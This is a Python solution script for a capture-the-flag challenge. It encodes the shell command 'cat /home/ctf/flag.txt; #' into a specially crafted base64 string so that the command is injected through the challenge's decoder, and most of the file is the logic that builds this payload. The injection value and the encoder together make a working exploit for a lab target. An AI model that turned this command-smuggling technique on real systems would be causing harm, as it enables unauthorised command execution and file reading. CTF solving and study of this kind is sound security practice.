#!/usr/bin/env python3

import sys

# This solution is much more complicated than it needs to be because it was written
# for a more complicated version of the challenge. That version had problems
# and was simplified which made much of the extra logic here obsolete.

cmd = 'cat /home/ctf/flag.txt; #'

def bytes_to_bits(bs):

    bits = []

    for b in bs:
        for i in range(7, -1, -1):
            bits.append(((1 << i) & b) >> i)

    return bits


def num_from_bits(bitl, offset):

    nbits = bitl[(offset + 128 * 8):(offset + 128 * 8) + 6]

    num = nbits[0] * 32 + nbits[1] * 16 + nbits[2] * 8 + nbits[3] * 4 + nbits[4] * 2 + nbits[5]

    return num


def num_to_b64(num):

    if num < 26:
        return chr(ord('A') + num)
    elif num < 52:
        return chr(ord('a') + (num - 26))
    elif num < 62:
        return chr(ord('0') + (num - 52))
    elif num == 62:
        return '+'
    elif num == 63:
        return '/'
    else:
        print(f"Got num {num}")
        sys.exit(1)


def bit_offset_to_byte_bit(offset):

    if offset >= 0:
        return (offset // 8, offset % 8)
    else:
        #return ((abs(offset) // 8) * -1, ((offset % 8) + 8) % 8)
        return (offset // 8, offset % 8)


def byte_bit_to_offset(btup):

    (by, bi) = btup

    return by * 8 + bi


def update_offset(offset, delta):

    return byte_bit_to_offset(bit_offset_to_byte_bit(offset + delta))



bitl = bytes_to_bits(bytes(cmd, 'utf-8'))

#print(bitl)


maxo = -128 * 8
curo = 0
endo = maxo + len(bitl)

bitl += [0] * 8

b64 = ''
while maxo < endo:

    #print(f"curo: {curo}; maxo: {maxo}; b64: {b64}")

    if curo > maxo or curo + 6 > endo:
        b64 += '='
        curo -= 2
        continue

    btup = bit_offset_to_byte_bit(curo)

    #print(f"Operating on byte_idx {btup[0]}, bits_mod: {btup[1]}")

    trueo = update_offset(curo, 0)

    #print(f"curo: {curo}; trueo: {trueo}")

    b64 += num_to_b64(num_from_bits(bitl, trueo))

    curo += 6
    maxo = curo


print(b64)
print('.')
